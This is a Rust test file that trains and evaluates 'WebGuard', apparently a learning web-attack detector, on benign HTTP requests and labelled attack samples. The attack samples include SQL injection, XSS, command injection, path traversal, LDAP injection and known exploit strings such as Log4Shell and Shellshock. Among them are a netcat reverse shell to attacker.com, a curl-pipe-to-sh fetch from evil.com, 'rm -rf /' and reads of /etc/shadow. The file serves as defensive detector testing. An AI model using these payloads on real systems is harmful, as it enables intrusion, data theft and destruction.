use webguard::webguard_system::WebGuardSystem;
use std::fs;
use std::path::Path;
use serde_json;
use serde::{Serialize, Deserialize};

#[derive(Debug, Serialize, Deserialize, Clone)]
struct TestSample {
    request: String,
    is_threat: bool,
    attack_type: Option<String>,
    description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct LearningProgress {
    iteration: usize,
    phase: String,
    accuracy: f32,
    precision: f32,
    recall: f32,
    f1_score: f32,
    learned_patterns: usize,
    false_positives: usize,
    false_negatives: usize,
    true_positives: usize,
    true_negatives: usize,
    cumulative_reward: f32,
    reward_delta: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct AttackTypeMetrics {
    attack_type: String,
    samples_tested: usize,
    detected: usize,
    missed: usize,
    detection_rate: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct MultipassResults {
    pass_number: usize,
    accuracy: f32,
    precision: f32,
    recall: f32,
    f1_score: f32,
    improvement_from_previous: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct RewardSystemMetrics {
    total_rewards: f32,
    positive_rewards: usize,
    negative_rewards: usize,
    reward_efficiency: f32,
    learning_acceleration: f32,
}

#[derive(Debug, Serialize, Deserialize)]
struct ComprehensiveTestResults {
    test_name: String,
    test_timestamp: String,
    
    // Phase 1: Benign Training
    benign_training_samples: usize,
    benign_training_accuracy: f32,
    baseline_false_positive_rate: f32,
    
    // Phase 2: Threat Introduction
    threat_samples_by_type: Vec<AttackTypeMetrics>,
    total_threat_samples: usize,
    
    // Learning Progression
    learning_progression: Vec<LearningProgress>,
    
    // Multipass Results
    multipass_results: Vec<MultipassResults>,
    multipass_improvement: f32,
    
    // Reward System Analysis
    reward_metrics: RewardSystemMetrics,
    
    // Final Metrics
    final_accuracy: f32,
    final_precision: f32,
    final_recall: f32,
    final_f1_score: f32,
    patterns_learned: usize,
    knowledge_transfer_data: String,
    
    // Summary
    total_samples_processed: usize,
    learning_efficiency: f32,
}

fn generate_benign_samples(count: usize) -> Vec<TestSample> {
    let mut samples = Vec::new();
    
    // Normal web requests - diverse legitimate traffic patterns
    let normal_requests = vec![
        "GET /index.html HTTP/1.1",
        "POST /api/users HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "POST /login HTTP/1.1",
        "GET /dashboard HTTP/1.1",
        "PUT /api/profile HTTP/1.1",
        "DELETE /api/session HTTP/1.1",
        "GET /search?q=rust+programming HTTP/1.1",
        "POST /contact HTTP/1.1",
        "GET /about HTTP/1.1",
        "GET /products HTTP/1.1",
        "POST /api/orders HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "GET /js/app.js HTTP/1.1",
        "POST /api/comments HTTP/1.1",
        "GET /blog/article-1 HTTP/1.1",
        "PUT /api/settings HTTP/1.1",
        "GET /help HTTP/1.1",
        "POST /newsletter HTTP/1.1",
        "GET /privacy HTTP/1.1",
        "GET /api/health HTTP/1.1",
        "POST /api/checkout HTTP/1.1",
        "GET /static/bundle.js HTTP/1.1",
        "PUT /api/cart HTTP/1.1",
        "GET /sitemap.xml HTTP/1.1",
    ];
    
    for i in 0..count {
        let request = normal_requests[i % normal_requests.len()].to_string();
        let variation = match i % 10 {
            0 => format!("{} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", request),
            1 => format!("{} Accept: text/html,application/xhtml+xml", request),
            2 => format!("{} Content-Type: application/json", request),
            3 => format!("{} Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", request),
            4 => format!("{} Cookie: session=abc123; _ga=GA1.2.123456", request),
            5 => format!("{} Referer: https://example.com/page", request),
            6 => format!("{} Accept-Language: en-US,en;q=0.9", request),
            7 => format!("{} Cache-Control: no-cache", request),
            8 => format!("{} Connection: keep-alive", request),
            _ => request,
        };
        
        samples.push(TestSample {
            request: variation,
            is_threat: false,
            attack_type: None,
            description: format!("Benign request #{}", i + 1),
        });
    }
    
    samples
}

fn generate_threat_samples() -> Vec<TestSample> {
    let mut samples = Vec::new();
    
    // SQL Injection samples - comprehensive attack patterns
    let sql_injections = vec![
        ("GET /search?q=' OR 1=1-- HTTP/1.1", "Basic OR bypass"),
        ("POST /login username=admin' OR '1'='1 HTTP/1.1", "Login bypass"),
        ("GET /user?id=1; DROP TABLE users-- HTTP/1.1", "Destructive DROP"),
        ("POST /api/data {\"query\": \"SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin\"} HTTP/1.1", "UNION attack"),
        ("GET /products?category=' UNION SELECT creditcard FROM customers-- HTTP/1.1", "Data exfiltration"),
        ("GET /api/user?id=1' AND SLEEP(5)-- HTTP/1.1", "Time-based blind SQLi"),
        ("POST /search query=1' AND (SELECT COUNT(*) FROM users)>0-- HTTP/1.1", "Boolean-based blind SQLi"),
        ("GET /item?id=1' ORDER BY 10-- HTTP/1.1", "Column enumeration"),
        ("POST /login user=admin'/* password=*/-- HTTP/1.1", "Comment bypass"),
        ("GET /api/v1/users?filter=id=1;EXEC xp_cmdshell('whoami')-- HTTP/1.1", "Stored procedure exploit"),
    ];
    
    // XSS samples - various injection vectors
    let xss_attacks = vec![
        ("GET /search?q=<script>alert('xss')</script> HTTP/1.1", "Basic script injection"),
        ("POST /comment content=<img src=x onerror=alert(1)> HTTP/1.1", "Event handler XSS"),
        ("GET /profile?name=<svg onload=alert(document.cookie)> HTTP/1.1", "SVG-based XSS"),
        ("POST /feedback message=<iframe src=javascript:alert(1)></iframe> HTTP/1.1", "iframe injection"),
        ("GET /page?data=<body onload=alert('XSS')> HTTP/1.1", "Body event XSS"),
        ("POST /api/message text=<div style=\"background:url(javascript:alert(1))\"> HTTP/1.1", "CSS-based XSS"),
        ("GET /render?html=<marquee onstart=alert(1)> HTTP/1.1", "Deprecated tag XSS"),
        ("POST /template data=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)> HTTP/1.1", "Math tag XSS"),
        ("GET /display?content=<a href=\"javascript:alert(1)\">click</a> HTTP/1.1", "JavaScript URL XSS"),
        ("POST /editor content=<input onfocus=alert(1) autofocus> HTTP/1.1", "Autofocus XSS"),
    ];
    
    // Command Injection samples
    let command_injections = vec![
        ("GET /ping?host=127.0.0.1; cat /etc/passwd HTTP/1.1", "Semicolon injection"),
        ("POST /backup filename=test.txt && rm -rf / HTTP/1.1", "AND operator injection"),
        ("GET /exec?cmd=ls | nc attacker.com 1234 HTTP/1.1", "Pipe injection"),
        ("POST /upload file=shell.php; nc -e /bin/sh attacker.com 4444 HTTP/1.1", "Reverse shell"),
        ("GET /system?cmd=`whoami` HTTP/1.1", "Backtick injection"),
        ("POST /run command=$(cat /etc/shadow) HTTP/1.1", "Command substitution"),
        ("GET /api/ping?ip=127.0.0.1%0Acat%20/etc/passwd HTTP/1.1", "Newline injection"),
        ("POST /execute cmd=ping -c 1 127.0.0.1 || cat /etc/passwd HTTP/1.1", "OR operator injection"),
        ("GET /check?host=127.0.0.1%26%26id HTTP/1.1", "URL encoded AND"),
        ("POST /diagnose target=$(curl http://evil.com/shell.sh|sh) HTTP/1.1", "Curl-based RCE"),
    ];
    
    // Path Traversal samples
    let path_traversals = vec![
        ("GET /download?file=../../../etc/passwd HTTP/1.1", "Basic traversal"),
        ("GET /view?page=....//....//....//etc/hosts HTTP/1.1", "Double encoding bypass"),
        ("POST /include path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1", "Windows traversal"),
        ("GET /read?filename=../../../var/log/auth.log HTTP/1.1", "Log file access"),
        ("GET /file?path=....\\....\\....\\boot.ini HTTP/1.1", "Windows boot file"),
        ("GET /static?file=....//....//....//proc/self/environ HTTP/1.1", "Process env access"),
        ("POST /load template=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1", "URL encoded traversal"),
        ("GET /assets?path=/var/www/html/../../../etc/shadow HTTP/1.1", "Absolute path traversal"),
        ("GET /image?src=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1", "Double URL encoding"),
        ("POST /fetch url=file:///etc/passwd HTTP/1.1", "File protocol SSRF"),
    ];
    
    // Software Exploit patterns (web service specific)
    let web_exploits = vec![
        ("POST /api/deserialize data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA HTTP/1.1", "Java deserialization"),
        ("GET /struts2-showcase/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} HTTP/1.1", "Struts2 OGNL injection"),
        ("POST /xmlrpc.php <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodCall><methodName>&xxe;</methodName></methodCall> HTTP/1.1", "XXE injection"),
        ("GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1", "WordPress RevSlider LFI"),
        ("POST /cgi-bin/test.cgi HTTP/1.1 () { :;}; /bin/cat /etc/passwd", "Shellshock"),
        ("GET /manager/html HTTP/1.1 Authorization: Basic YWRtaW46YWRtaW4=", "Tomcat default creds"),
        ("POST /api/v1/pods?fieldManager=kubectl-client-side-apply {\"spec\":{\"containers\":[{\"image\":\"evil\",\"command\":[\"/bin/sh\"]}]}} HTTP/1.1", "K8s privilege escalation"),
        ("GET /solr/admin/cores?action=CREATE&wt=json&name=${jndi:ldap://evil.com/a} HTTP/1.1", "Log4Shell"),
        ("POST /api/graphql {\"query\":\"mutation{__typename @include(if: $foo)}\"} HTTP/1.1", "GraphQL DoS"),
        ("GET /.git/config HTTP/1.1", "Git config exposure"),
    ];
    
    // LDAP Injection samples
    let ldap_injections = vec![
        ("POST /auth user=admin)(|(password=*)) HTTP/1.1", "LDAP OR injection"),
        ("GET /search?filter=(&(cn=*)(userPassword=*)) HTTP/1.1", "Password enumeration"),
        ("POST /login username=*)(uid=*))(|(uid=* HTTP/1.1", "Wildcard injection"),
        ("GET /users?query=(|(cn=*)(mail=*)) HTTP/1.1", "User enumeration"),
        ("POST /directory search=admin)(&(objectClass=*)) HTTP/1.1", "Object enumeration"),
    ];
    
    let all_attacks: Vec<(Vec<(&str, &str)>, &str)> = vec![
        (sql_injections, "SQL Injection"),
        (xss_attacks, "Cross-Site Scripting"),
        (command_injections, "Command Injection"),
        (path_traversals, "Path Traversal"),
        (web_exploits, "Web Service Exploit"),
        (ldap_injections, "LDAP Injection"),
    ];
    
    for (attacks, attack_type) in all_attacks {
        for (attack, description) in attacks {
            samples.push(TestSample {
                request: attack.to_string(),
                is_threat: true,
                attack_type: Some(attack_type.to_string()),
                description: format!("{}: {}", attack_type, description),
            });
        }
    }
    
    samples
}

fn calculate_metrics(tp: usize, tn: usize, fp: usize, fn_count: usize) -> (f32, f32, f32, f32) {
    let accuracy = if tp + tn + fp + fn_count > 0 {
        (tp + tn) as f32 / (tp + tn + fp + fn_count) as f32
    } else { 0.0 };
    
    let precision = if tp + fp > 0 {
        tp as f32 / (tp + fp) as f32
    } else { 0.0 };
    
    let recall = if tp + fn_count > 0 {
        tp as f32 / (tp + fn_count) as f32
    } else { 0.0 };
    
    let f1_score = if precision + recall > 0.0 {
        2.0 * (precision * recall) / (precision + recall)
    } else { 0.0 };
    
    (accuracy, precision, recall, f1_score)
}

fn calculate_reward(predicted_threat: bool, actual_threat: bool, confidence: f32) -> f32 {
    match (predicted_threat, actual_threat) {
        (true, true) => 1.0 * confidence,       // True positive: high reward
        (false, false) => 0.5 * confidence,     // True negative: moderate reward
        (true, false) => -0.5 * confidence,     // False positive: negative reward
        (false, true) => -1.0 * confidence,     // False negative: high penalty (missed threat)
    }
}

#[test]
fn test_comprehensive_experiential_learning() {
    println!("╔══════════════════════════════════════════════════════════════════════════════╗");
    println!("║     WebGuard Comprehensive Experiential Learning Test                        ║");
    println!("║     Phase 1: Benign Training → Phase 2: Threat Introduction → Multipass     ║");
    println!("╚══════════════════════════════════════════════════════════════════════════════╝\n");
    
    // Create test directories
    let test_dir = Path::new("tests");
    let results_dir = test_dir.join("results");
    fs::create_dir_all(&results_dir).expect("Failed to create results directory");
    
    // Initialize WebGuard
    let mut webguard = WebGuardSystem::new();
    
    // Track all metrics
    let mut learning_progression: Vec<LearningProgress> = Vec::new();
    let mut multipass_results: Vec<MultipassResults> = Vec::new();
    let mut cumulative_reward: f32 = 0.0;
    let mut positive_rewards: usize = 0;
    let mut negative_rewards: usize = 0;
    let mut total_patterns_learned: usize = 0;
    let mut iteration_counter: usize = 0;
    
    // ═══════════════════════════════════════════════════════════════════════════════
    // PHASE 1: BENIGN TRAINING (Establish baseline behavior)
    // ═══════════════════════════════════════════════════════════════════════════════
    println!("┌────────────────────────────────────────────────────────────────────────────┐");
    println!("│ PHASE 1: BENIGN TRAINING - Establishing Normal Behavior Baseline          │");
    println!("└────────────────────────────────────────────────────────────────────────────┘");
    
    let benign_training_samples = generate_benign_samples(500);
    println!("📚 Training on {} benign samples...\n", benign_training_samples.len());
    
    let mut phase1_fp = 0;
    let mut phase1_tn = 0;
    
    for (i, sample) in benign_training_samples.iter().enumerate() {
        let result = webguard.analyze_request(&sample.request);
        let predicted_threat = result.threat_score > 0.5;
        
        if predicted_threat {
            phase1_fp += 1;
        } else {
            phase1_tn += 1;
        }
        
        let reward = calculate_reward(predicted_threat, false, result.confidence);
        cumulative_reward += reward;
        if reward > 0.0 { positive_rewards += 1; } else { negative_rewards += 1; }
        
        // Train on benign patterns
        webguard.learn_from_validation(&sample.request, false, None);
        
        // Log progress every 100 samples
        if (i + 1) % 100 == 0 {
            iteration_counter += 1;
            total_patterns_learned += 1;
            let accuracy = phase1_tn as f32 / (phase1_tn + phase1_fp) as f32;
            println!("  ✓ Trained {} samples | FP Rate: {:.1}% | Cumulative Reward: {:.2}", 
                     i + 1, (phase1_fp as f32 / (i + 1) as f32) * 100.0, cumulative_reward);
            
            learning_progression.push(LearningProgress {
                iteration: iteration_counter,
                phase: "Benign Training".to_string(),
                accuracy,
                precision: 0.0,
                recall: 0.0,
                f1_score: 0.0,
                learned_patterns: total_patterns_learned,
                false_positives: phase1_fp,
                false_negatives: 0,
                true_positives: 0,
                true_negatives: phase1_tn,
                cumulative_reward,
                reward_delta: reward,
            });
        }
    }
    
    let benign_training_accuracy = phase1_tn as f32 / (phase1_tn + phase1_fp) as f32;
    let baseline_fp_rate = phase1_fp as f32 / benign_training_samples.len() as f32;
    
    println!("\n📊 Phase 1 Complete:");
    println!("   Benign Training Accuracy: {:.1}%", benign_training_accuracy * 100.0);
    println!("   Baseline False Positive Rate: {:.1}%", baseline_fp_rate * 100.0);
    println!("   Patterns Learned: {}\n", total_patterns_learned);
    
    // ═══════════════════════════════════════════════════════════════════════════════
    // PHASE 2: THREAT INTRODUCTION (Test attack detection)
    // ═══════════════════════════════════════════════════════════════════════════════
    println!("┌────────────────────────────────────────────────────────────────────────────┐");
    println!("│ PHASE 2: THREAT INTRODUCTION - Testing Attack Detection                   │");
    println!("└────────────────────────────────────────────────────────────────────────────┘");
    
    let threat_samples = generate_threat_samples();
    println!("🎯 Testing {} threat samples across attack types...\n", threat_samples.len());
    
    // Track metrics by attack type
    let mut attack_metrics: std::collections::HashMap<String, (usize, usize, usize)> = std::collections::HashMap::new();
    
    for sample in &threat_samples {
        let attack_type = sample.attack_type.clone().unwrap_or("Unknown".to_string());
        attack_metrics.entry(attack_type).or_insert((0, 0, 0));
    }
    
    let mut phase2_tp = 0;
    let mut phase2_fn = 0;
    
    for sample in &threat_samples {
        let result = webguard.analyze_request(&sample.request);
        let predicted_threat = result.threat_score > 0.5;
        let attack_type = sample.attack_type.clone().unwrap_or("Unknown".to_string());
        
        let entry = attack_metrics.get_mut(&attack_type).unwrap();
        entry.0 += 1; // samples tested
        
        if predicted_threat {
            phase2_tp += 1;
            entry.1 += 1; // detected
        } else {
            phase2_fn += 1;
            entry.2 += 1; // missed
        }
        
        let reward = calculate_reward(predicted_threat, true, result.confidence);
        cumulative_reward += reward;
        if reward > 0.0 { positive_rewards += 1; } else { negative_rewards += 1; }
        
        // Learn from threat patterns
        webguard.learn_from_validation(&sample.request, true, sample.attack_type.clone());
    }
    
    // Build attack type metrics
    let mut threat_samples_by_type: Vec<AttackTypeMetrics> = Vec::new();
    println!("  Attack Type Detection Results:");
    println!("  ─────────────────────────────────────────────────────────");
    for (attack_type, (tested, detected, missed)) in &attack_metrics {
        let detection_rate = if *tested > 0 { *detected as f32 / *tested as f32 } else { 0.0 };
        println!("  │ {:25} │ Detected: {:2}/{:2} ({:5.1}%) │", 
                 attack_type, detected, tested, detection_rate * 100.0);
        threat_samples_by_type.push(AttackTypeMetrics {
            attack_type: attack_type.clone(),
            samples_tested: *tested,
            detected: *detected,
            missed: *missed,
            detection_rate,
        });
    }
    println!("  ─────────────────────────────────────────────────────────");
    
    let initial_detection_rate = phase2_tp as f32 / (phase2_tp + phase2_fn) as f32;
    println!("\n📊 Phase 2 Initial Detection Rate: {:.1}%", initial_detection_rate * 100.0);
    
    iteration_counter += 1;
    total_patterns_learned += threat_samples.len();
    learning_progression.push(LearningProgress {
        iteration: iteration_counter,
        phase: "Threat Introduction".to_string(),
        accuracy: initial_detection_rate,
        precision: phase2_tp as f32 / (phase2_tp + phase1_fp) as f32,
        recall: initial_detection_rate,
        f1_score: 0.0,
        learned_patterns: total_patterns_learned,
        false_positives: phase1_fp,
        false_negatives: phase2_fn,
        true_positives: phase2_tp,
        true_negatives: phase1_tn,
        cumulative_reward,
        reward_delta: cumulative_reward,
    });
    
    // ═══════════════════════════════════════════════════════════════════════════════
    // PHASE 2.5: RETENTION TEST - Verify benign patterns still recognized
    // ═══════════════════════════════════════════════════════════════════════════════
    println!("\n┌────────────────────────────────────────────────────────────────────────────┐");
    println!("│ PHASE 2.5: RETENTION TEST - Verifying Benign Learning Retained            │");
    println!("└────────────────────────────────────────────────────────────────────────────┘");
    
    // Re-test the SAME benign samples from Phase 1 to verify retention
    let retention_benign = generate_benign_samples(100);  // Same pattern pool as Phase 1
    let mut retention_fp = 0;
    let mut retention_tn = 0;
    
    for sample in &retention_benign {
        let result = webguard.analyze_request(&sample.request);
        let predicted_threat = result.threat_score > 0.5;
        
        if predicted_threat {
            retention_fp += 1;
        } else {
            retention_tn += 1;
        }
    }
    
    let retention_accuracy = retention_tn as f32 / (retention_tn + retention_fp) as f32;
    println!("📊 Benign Retention Test (100 samples from same pattern pool):");
    println!("   True Negatives: {} | False Positives: {}", retention_tn, retention_fp);
    println!("   Retention Accuracy: {:.1}%", retention_accuracy * 100.0);
    
    if retention_fp > 10 {
        println!("   ⚠️  WARNING: Threat learning interfered with benign recognition!");
        println!("   This indicates the differential RL suppression factor may need tuning.");
    } else {
        println!("   ✅ Benign patterns correctly retained after threat learning!");
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // PHASE 3: ADAPTIVE SELF-LEARNING (True generalization test)
    // ═══════════════════════════════════════════════════════════════════════════════
    println!("\n┌────────────────────────────────────────────────────────────────────────────┐");
    println!("│ PHASE 3: ADAPTIVE SELF-LEARNING - Generalization Test                     │");
    println!("└────────────────────────────────────────────────────────────────────────────┘");
    
    // TRUE ADAPTIVE LEARNING TEST:
    // - Split data into TRAIN and TEST sets
    // - Each pass: train on train set, evaluate on HELD-OUT test set
    // - Improvement on test set proves GENERALIZATION, not memorization
    
    let num_passes = 15;
    
    // Split threats into TRAIN (70%) and TEST (30%) - tests on UNSEEN threats
    let threat_split = (threat_samples.len() * 7) / 10;
    let train_threats: Vec<TestSample> = threat_samples.iter().take(threat_split).cloned().collect();
    let test_threats: Vec<TestSample> = threat_samples.iter().skip(threat_split).cloned().collect();
    
    // Split benign similarly
    let benign_for_test: Vec<TestSample> = benign_training_samples.iter().skip(400).take(100).cloned().collect();
    let benign_for_train: Vec<TestSample> = benign_training_samples.iter().take(200).cloned().collect();
    
    // Training set: 200 benign + 70% of threats
    let mut train_samples: Vec<TestSample> = Vec::new();
    train_samples.extend(benign_for_train.clone());
    train_samples.extend(train_threats.clone());
    
    // Test set: 100 DIFFERENT benign + 30% UNSEEN threats
    let mut test_samples: Vec<TestSample> = Vec::new();
    test_samples.extend(benign_for_test.clone());
    test_samples.extend(test_threats.clone());
    
    println!("📊 Dataset Split for Generalization Test:");
    println!("   Training: {} benign + {} threats = {} samples", 
             benign_for_train.len(), train_threats.len(), train_samples.len());
    println!("   Testing:  {} benign + {} UNSEEN threats = {} samples",
             benign_for_test.len(), test_threats.len(), test_samples.len());
    println!("   (Test set contains threats NEVER seen during training)\n");
    
    let mut previous_f1: f32 = 0.0;
    
    println!("🔄 Executing {} learning passes...", num_passes);
    println!("   Each pass: Train on training set → Evaluate on HELD-OUT test set");
    println!("   Improvement on test set proves TRUE ADAPTIVE LEARNING\n");
    
    for pass in 1..=num_passes {
        // TRAIN PHASE: Learn from training samples
        let mut train_errors = 0;
        for sample in &train_samples {
            let result = webguard.analyze_request(&sample.request);
            let predicted_threat = result.threat_score > 0.5;
            let actual_threat = sample.is_threat;
            
            let reward = calculate_reward(predicted_threat, actual_threat, result.confidence);
            cumulative_reward += reward;
            if reward > 0.0 { positive_rewards += 1; } else { negative_rewards += 1; }
            
            if predicted_threat != actual_threat {
                train_errors += 1;
                webguard.learn_from_error(&sample.request, predicted_threat, actual_threat);
            } else {
                webguard.learn_from_validation(&sample.request, actual_threat, sample.attack_type.clone());
            }
        }
        
        // TEST PHASE: Evaluate on HELD-OUT test set (no learning here!)
        let mut tp = 0;
        let mut tn = 0;
        let mut fp = 0;
        let mut fn_count = 0;
        
        for sample in &test_samples {
            let result = webguard.analyze_request(&sample.request);
            let predicted_threat = result.threat_score > 0.5;
            let actual_threat = sample.is_threat;
            
            match (predicted_threat, actual_threat) {
                (true, true) => tp += 1,
                (false, false) => tn += 1,
                (true, false) => fp += 1,
                (false, true) => fn_count += 1,
            }
        }
        
        let (accuracy, precision, recall, f1_score) = calculate_metrics(tp, tn, fp, fn_count);
        let improvement = if pass > 1 { f1_score - previous_f1 } else { 0.0 };
        let pass_reward = cumulative_reward / pass as f32;
        
        println!("  Pass {} Results (on UNSEEN test data):", pass);
        println!("    Accuracy:  {:.1}% | Precision: {:.1}% | Recall: {:.1}% | F1: {:.3}", 
                 accuracy * 100.0, precision * 100.0, recall * 100.0, f1_score);
        println!("    TP: {} | TN: {} | FP: {} | FN: {} | Train Errors: {} | Improvement: {:+.3}\n",
                 tp, tn, fp, fn_count, train_errors, improvement);
        
        iteration_counter += 1;
        total_patterns_learned += train_errors;  // Patterns learned from errors
        
        learning_progression.push(LearningProgress {
            iteration: iteration_counter,
            phase: format!("Multipass {}", pass),
            accuracy,
            precision,
            recall,
            f1_score,
            learned_patterns: total_patterns_learned,
            false_positives: fp,
            false_negatives: fn_count,
            true_positives: tp,
            true_negatives: tn,
            cumulative_reward,
            reward_delta: pass_reward,
        });
        
        multipass_results.push(MultipassResults {
            pass_number: pass,
            accuracy,
            precision,
            recall,
            f1_score,
            improvement_from_previous: improvement,
        });
        
        previous_f1 = f1_score;
    }
    
    // ═══════════════════════════════════════════════════════════════════════════════
    // FINAL RESULTS AND SUMMARY
    // ═══════════════════════════════════════════════════════════════════════════════
    println!("╔══════════════════════════════════════════════════════════════════════════════╗");
    println!("║                           FINAL RESULTS SUMMARY                              ║");
    println!("╚══════════════════════════════════════════════════════════════════════════════╝\n");
    
    let final_progress = learning_progression.last().unwrap();
    let first_multipass = multipass_results.first().unwrap();
    let last_multipass = multipass_results.last().unwrap();
    let multipass_improvement = last_multipass.f1_score - first_multipass.f1_score;
    
    let reward_efficiency = if positive_rewards + negative_rewards > 0 {
        positive_rewards as f32 / (positive_rewards + negative_rewards) as f32
    } else { 0.0 };
    
    let learning_acceleration = if first_multipass.f1_score > 0.0 {
        (last_multipass.f1_score - first_multipass.f1_score) / first_multipass.f1_score
    } else { 0.0 };
    
    let knowledge_export = webguard.export_knowledge()
        .unwrap_or_else(|| "{}".to_string());
    
    let total_samples = benign_training_samples.len() + threat_samples.len() + (train_samples.len() * num_passes);
    
    println!("📈 Learning Progression:");
    println!("   Initial Detection Rate: {:.1}%", initial_detection_rate * 100.0);
    println!("   Final Accuracy: {:.1}%", final_progress.accuracy * 100.0);
    println!("   Final Precision: {:.1}%", final_progress.precision * 100.0);
    println!("   Final Recall: {:.1}%", final_progress.recall * 100.0);
    println!("   Final F1 Score: {:.3}", final_progress.f1_score);
    
    println!("\n🔄 Multipass Learning Benefits:");
    println!("   Pass 1 F1: {:.3} → Pass {} F1: {:.3}", first_multipass.f1_score, num_passes, last_multipass.f1_score);
    println!("   Total Improvement: {:+.3} ({:+.1}%)", multipass_improvement, multipass_improvement * 100.0);
    
    println!("\n🎁 Reward System Analysis:");
    println!("   Total Cumulative Reward: {:.2}", cumulative_reward);
    println!("   Positive Rewards: {} | Negative Rewards: {}", positive_rewards, negative_rewards);
    println!("   Reward Efficiency: {:.1}%", reward_efficiency * 100.0);
    println!("   Learning Acceleration: {:.1}%", learning_acceleration * 100.0);
    
    println!("\n📦 Knowledge Transfer:");
    println!("   Patterns Learned: {}", total_patterns_learned);
    println!("   Exportable Knowledge: {} bytes", knowledge_export.len());
    println!("   Total Samples Processed: {}", total_samples);
    
    // Create comprehensive results
    let comprehensive_results = ComprehensiveTestResults {
        test_name: "WebGuard Comprehensive Experiential Learning Test".to_string(),
        test_timestamp: chrono::Utc::now().to_rfc3339(),
        benign_training_samples: benign_training_samples.len(),
        benign_training_accuracy,
        baseline_false_positive_rate: baseline_fp_rate,
        threat_samples_by_type,
        total_threat_samples: threat_samples.len(),
        learning_progression: learning_progression.clone(),
        multipass_results: multipass_results.clone(),
        multipass_improvement,
        reward_metrics: RewardSystemMetrics {
            total_rewards: cumulative_reward,
            positive_rewards,
            negative_rewards,
            reward_efficiency,
            learning_acceleration,
        },
        final_accuracy: final_progress.accuracy,
        final_precision: final_progress.precision,
        final_recall: final_progress.recall,
        final_f1_score: final_progress.f1_score,
        patterns_learned: total_patterns_learned,
        knowledge_transfer_data: knowledge_export,
        total_samples_processed: total_samples,
        learning_efficiency: learning_acceleration,
    };
    
    // Save comprehensive results
    let results_json = serde_json::to_string_pretty(&comprehensive_results).unwrap();
    fs::write(results_dir.join("comprehensive_learning_results.json"), &results_json).unwrap();
    
    // Save learning progression CSV
    let mut csv_content = String::from("iteration,phase,accuracy,precision,recall,f1_score,learned_patterns,false_positives,false_negatives,true_positives,true_negatives,cumulative_reward,reward_delta\n");
    for progress in &learning_progression {
        csv_content.push_str(&format!("{},{},{},{},{},{},{},{},{},{},{},{},{}\n",
            progress.iteration, progress.phase, progress.accuracy, progress.precision, progress.recall,
            progress.f1_score, progress.learned_patterns, progress.false_positives,
            progress.false_negatives, progress.true_positives, progress.true_negatives,
            progress.cumulative_reward, progress.reward_delta));
    }
    fs::write(results_dir.join("learning_progression.csv"), &csv_content).unwrap();
    
    // Save multipass results CSV
    let mut multipass_csv = String::from("pass_number,accuracy,precision,recall,f1_score,improvement\n");
    for result in &multipass_results {
        multipass_csv.push_str(&format!("{},{},{},{},{},{}\n",
            result.pass_number, result.accuracy, result.precision, result.recall,
            result.f1_score, result.improvement_from_previous));
    }
    fs::write(results_dir.join("multipass_results.csv"), &multipass_csv).unwrap();
    
    // Save attack type breakdown
    let attack_breakdown_json = serde_json::to_string_pretty(&comprehensive_results.threat_samples_by_type).unwrap();
    fs::write(results_dir.join("attack_type_breakdown.json"), &attack_breakdown_json).unwrap();
    
    println!("\n✅ All results saved to tests/results/");
    println!("   • comprehensive_learning_results.json");
    println!("   • learning_progression.csv");
    println!("   • multipass_results.csv");
    println!("   • attack_type_breakdown.json");
    
    // Assertions
    assert!(final_progress.accuracy > 0.0, "Final accuracy should be positive");
    assert!(total_patterns_learned > 0, "Should have learned patterns");
    assert!(cumulative_reward != 0.0, "Reward system should be active");
    
    println!("\n🎉 Comprehensive experiential learning test completed successfully!");
}

